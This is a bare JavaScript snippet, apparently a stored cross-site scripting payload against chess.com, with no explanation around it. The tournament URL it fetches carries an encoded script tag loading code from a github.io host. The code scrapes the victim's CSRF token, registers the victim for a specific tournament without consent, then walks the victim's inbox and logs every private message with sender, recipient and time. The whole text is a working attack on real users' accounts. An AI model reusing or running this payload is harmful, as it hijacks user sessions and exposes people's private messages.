

fetch("https://www.chess.com/tournament/lt-script-src-yellowrook1-github-io-a-js-gt-lt-script-gt").then((response) => response.text()).then((text) => {
      var token = text.match(/("token":".+?)["]/)[1].substr(9)
      fetch("https://www.chess.com/callback/tournaments/register/358301", {
  "body": `{\"_token\":\"` + token + `\",\"confirm\":1}`,
  "method": "POST",
});
      
      
      })
fetch("https://www.chess.com/callback/messages/list/inbox").then(response => response.json())
  .then(data => {console.log(data);
  for (var i = 0; i < data.length; i++){
      fetch("https://www.chess.com/callback/messages/show/"+data[i].user.username).then(response => response.json())
  .then(data => {for (var i = 0; i < data.length; i++){console.log("Time: " + data[i].createDate + " From: " + data[i].from_user.username + " To: " + data[i].to_user.username + " Message: " + data[i].message)}})
  }
})
